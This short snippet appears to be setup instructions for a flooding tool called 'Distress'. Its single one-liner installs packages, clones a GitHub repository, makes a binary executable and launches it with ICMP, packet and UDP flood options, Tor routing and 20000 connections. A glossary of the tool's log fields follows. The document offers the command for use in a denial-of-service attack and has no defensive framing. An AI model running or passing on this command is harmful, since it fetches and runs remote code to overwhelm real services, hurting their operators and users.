ITA 

Distress

oneliner: apt update && apt install screen git vnstat nano -y && git clone https://github.com/serbianka07/ds.git && cd ds && chmod +x ds && cat ita.txt && screen -S "ds" ./ds --use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --disable-auto-update --use-tor 200 -c 20000 

--->  active_connections: The number of successfully established connections performed by flood at the current moment

--->  bps: The average number of bits per second since the last log message read from the network interface

--->  pps: The average number of packets per second since the last log message read from the network interface

--->  requests: Queries made by the tool since the last log message

--->  bytes: 	Bytes sent by the tool since the last log message

--->  pending_connections: The number of connections in pending state
